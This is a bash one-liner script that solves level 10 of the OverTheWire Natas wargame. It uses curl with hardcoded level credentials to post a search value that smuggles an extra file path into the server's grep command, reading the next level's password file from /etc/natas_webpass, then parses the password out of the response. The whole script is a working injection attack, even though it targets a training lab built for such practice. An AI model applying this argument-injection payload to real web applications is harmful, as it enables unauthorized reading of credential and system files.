#!/usr/bin/bash

curl -s -u natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu --data "needle=.* /etc/natas_webpass/natas11&submit=search" http://natas10.natas.labs.overthewire.org | head -n 30 | tail -1 | grep -oP '(?<=(:)).*'

